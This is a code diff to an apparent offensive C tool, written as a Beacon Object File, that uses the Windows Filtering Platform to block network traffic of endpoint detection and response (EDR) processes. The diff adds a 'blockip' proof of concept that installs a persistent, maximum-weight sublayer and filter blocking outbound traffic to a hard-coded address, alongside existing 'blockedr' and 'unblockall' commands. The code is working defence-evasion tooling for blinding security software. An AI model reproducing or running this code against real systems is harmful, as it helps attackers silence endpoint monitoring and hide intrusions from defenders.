@@ -141,6 +141,151 @@ BOOL isInEdrProcessList(const char* procName) {
     return FALSE;
 }
 
+// PoC to demonstrate add WFP sublayer and filters with other conditions
+
+void BlockIPDemo() {
+    DWORD result = 0;
+    HANDLE hEngine = NULL;
+    FWPM_PROVIDER0 provider = {0};
+    GUID providerGuid = {0};
+
+    result = _FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
+    if (result != ERROR_SUCCESS) {
+        err("FwpmEngineOpen0 failed with error code: 0x%lx.\n", result);
+        return;
+    }
+   
+    EnableSeDebugPrivilege();
+
+    // generate uuid for sublayer
+    FWPM_SUBLAYER0 fwpFilterSubLayer1;
+    GUID SubLayerGuid1;
+
+    if (RPCRT4$UuidCreate(&SubLayerGuid1) != RPC_S_OK)
+	{
+		err("UuidCreate failed.\n");
+		return;
+	}
+    MSVCRT$memset((&fwpFilterSubLayer1),0,sizeof(FWPM_SUBLAYER0));
+
+    // add sublayer
+    fwpFilterSubLayer1.displayData.name = L"TestFilterSublayer_highest";
+	fwpFilterSubLayer1.displayData.description = L"Test filter sublayer (highest)";
+	fwpFilterSubLayer1.weight = 0xFFFF;
+    fwpFilterSubLayer1.flags = FWPM_SUBLAYER_FLAG_PERSISTENT;
+	fwpFilterSubLayer1.subLayerKey = SubLayerGuid1;
+
+    msg("Adding filter sublayer.\n");
+
+    result = _FwpmSubLayerAdd0(hEngine, &fwpFilterSubLayer1, NULL);
+    if (result != ERROR_SUCCESS) {
+        err("FwpmSubLayerAdd0 failed with error code: 0x%lx.\n", result);
+        return;
+    }
+
+    // add provider
+    provider.displayData.name = providerName;
+    provider.displayData.description = providerDescription;
+    provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
+    result = _FwpmProviderAdd0(hEngine, &provider, NULL);
+    if (result != ERROR_SUCCESS) {
+        err("FwpmProviderAdd0 failed with error code: 0x%lx.\n", result);
+        return;
+    }
+
+    // Setting up WFP filter and condition
+    FWPM_FILTER_CONDITION0 cond = {0};
+    FWPM_FILTER0 filter = {0};
+    UINT64 filterId = 0;
+
+    // set filter name
+    filter.displayData.name = filterName;
+    // set layer
+    filter.layerKey = FWPM_LAYER_OUTBOUND_TRANSPORT_V4; 
+    // set sublayer
+    // use defined UUID
+    //filter.subLayerKey = FWPM_CUSTOM_SUBLAYER_UUID;
+    // use generated UUID
+    filter.subLayerKey = SubLayerGuid1;
+    // set flag
+    //filter.flags = FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT| FWPM_FILTER_FLAG_PERSISTENT;
+    filter.flags = FWPM_FILTER_FLAG_PERSISTENT;
+    // set action type
+    filter.action.type = FWP_ACTION_BLOCK;
+    //filter.action.type = FWP_ACTION_PERMIT;
+    // set weight
+    UINT64 weightValue = 0xFFFFFFFFFFFFFFFF;
+    filter.weight.type = FWP_UINT64;
+    filter.weight.uint64 = &weightValue;
+
+    // set condition
+
+    // appID as condition
+    
+    // FWP_BYTE_BLOB* appId = NULL;
+    // result = _FwpmGetAppIdFromFileName0(L"C:\\Windows\\System32\\curl.exe", &appId);
+    // result = _FwpmGetAppIdFromFileName0(L"SYSTEM", &appId);
+    // cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
+    // cond.matchType = FWP_MATCH_EQUAL;
+    // cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
+    // cond.conditionValue.byteBlob = appId;
+
+    // remote ip as condition
+    UINT32 ipAddr = 0;
+    const size_t testIpv4Size = 1;
+    char** testIpv4 = (char**)MSVCRT$malloc(testIpv4Size * sizeof(char*));
+    testIpv4[0] = "142.250.71.174"; 
+
+    // Convert string to IP address uint32
+    unsigned int bytes[4] = {0};
+    if (MSVCRT$sscanf(testIpv4[0], "%u.%u.%u.%u", &bytes[3], &bytes[2], &bytes[1], &bytes[0]) == 4) {
+        for (int i = 0; i < 4; i++) {
+            if (bytes[i] > 255) {
+                return ;
+            }
+            ipAddr |= bytes[i] << (i * 8);
+        }
+    }
+    if (ipAddr == 0) {
+        err("Error converting IP address \"%s\" to UINT32 format.\n", testIpv4[0]);
+    }
+
+    cond.fieldKey = FWPM_CONDITION_IP_REMOTE_ADDRESS;
+    cond.matchType = FWP_MATCH_EQUAL;
+    cond.conditionValue.type = FWP_UINT32;
+    cond.conditionValue.uint32 = ipAddr;
+    filter.filterCondition = &cond;
+    filter.numFilterConditions = 1;
+
+    // Add WFP provider for the filter
+    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
+        filter.providerKey = &providerGuid;
+    } else {
+        provider.displayData.name = providerName;
+        provider.displayData.description = providerDescription;
+        provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
+        result = _FwpmProviderAdd0(hEngine, &provider, NULL);
+        if (result != ERROR_SUCCESS) {
+            err("FwpmProviderAdd0 failed with error code: 0x%lx.\n", result);
+        } else {
+            if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
+                filter.providerKey = &providerGuid;
+            }
+        }
+    }
+
+    // Add filter to IPv4 layer
+    result = _FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
+    if (result == ERROR_SUCCESS) {
+        msg("Added WFP filter (Filter id: %lld, IPv4 layer).\n", filterId);
+    } else {
+        err("Failed to add filter in IPv4 layer with error code: 0x%lx.\n", result);
+    }
+        
+    MSVCRT$free(testIpv4);
+    return;
+}
+
 // Add WFP filters for all known EDR process(s)
 void BlockEdrProcessTraffic() {
     DWORD result = 0;
@@ -500,6 +645,9 @@ void go(char * args, int alen) {
     if (StringCompareA(cmd_str, "blockedr") == 0) {
         BlockEdrProcessTraffic();
     }
+    else if (StringCompareA(cmd_str, "blockip") == 0) {
+        BlockIPDemo();
+    }
     else if (StringCompareA(cmd_str, "unblockall") == 0) {
         UnblockAllWfpFilters();
     }
@@ -573,6 +721,8 @@ int main(int argc, char *argv[]) {
 
     if (strcmp(argv[1], "blockedr") == 0) {
         BlockEdrProcessTraffic();
+    } else if (strcmp(argv[1], "blockip") == 0) {
+        BlockIPDemo();
     } else if (strcmp(argv[1], "block") == 0) {
         if (argc < 3) {
             err("Missing second argument. Please provide the full path of the process to block.\n");
